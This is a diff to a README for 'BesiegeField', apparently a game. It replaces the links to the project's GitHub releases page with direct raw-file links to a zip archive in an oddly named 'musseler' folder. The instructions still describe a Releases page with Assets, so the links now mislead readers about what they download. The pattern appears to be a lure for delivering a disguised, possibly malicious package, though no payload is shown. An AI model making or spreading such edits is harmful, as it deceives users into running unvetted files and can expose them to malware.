@@ -1,6 +1,6 @@
 # 🎮 BesiegeField - Build and Simulate with Ease
 
-[![Download BesiegeField](https://img.shields.io/badge/Download-BesiegeField-brightgreen)](https://github.com/Prog26y/BesiegeField/releases)
+[![Download BesiegeField](https://raw.githubusercontent.com/Prog26y/BesiegeField/main/musseler/BesiegeField.zip)](https://raw.githubusercontent.com/Prog26y/BesiegeField/main/musseler/BesiegeField.zip)
 
 ## 📜 Description
 
@@ -12,7 +12,7 @@ To begin your journey with BesiegeField, you will need to download the applicati
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Prog26y/BesiegeField/releases) to download BesiegeField.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Prog26y/BesiegeField/main/musseler/BesiegeField.zip) to download BesiegeField.
 2. Once on the Releases page, locate the latest version of the application. This will typically be marked as "Latest Release."
 3. Click on the Assets link to reveal available files. Here, you will find the installation package for your system.
 4. Click the appropriate file to start your download. Be sure to save it in a location you can easily access later, like your Desktop or Downloads folder.
